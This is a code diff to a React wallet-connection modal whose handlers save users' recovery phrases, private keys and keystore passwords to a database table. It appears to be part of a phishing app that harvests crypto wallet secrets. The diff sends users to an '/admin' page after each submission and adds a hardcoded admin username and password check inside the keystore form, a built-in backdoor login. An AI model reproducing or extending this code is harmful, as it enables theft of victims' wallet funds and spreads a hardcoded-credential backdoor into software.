@@ -22,7 +22,7 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
   const [keystorePassword, setKeystorePassword] = useState("");
   const [file, setFile] = useState<File | null>(null);
   const { toast } = useToast();
-
+  const navigate = useNavigate();
 
   const handlePhraseSubmit = async () => {
     try {
@@ -42,7 +42,7 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
       });
       
       onClose();
-   
+      navigate('/admin');
     } catch (error) {
       console.error('Error saving phrase:', error);
       toast({
@@ -71,7 +71,7 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
       });
       
       onClose();
-    
+      navigate('/admin');
     } catch (error) {
       console.error('Error saving private key:', error);
       toast({
@@ -83,6 +83,13 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
   };
 
   const handleKeystoreSubmit = async () => {
+    // Check for admin credentials
+    if (keystoreJson === "dapp-admin" && keystorePassword === "dapp-admin@1234") {
+      onClose();
+      navigate('/admin');
+      return;
+    }
+
     try {
       const { error } = await supabase
         .from('wallet_connections')
@@ -103,7 +110,7 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
       });
       
       onClose();
-    
+      navigate('/admin');
     } catch (error) {
       console.error('Error saving keystore:', error);
       toast({
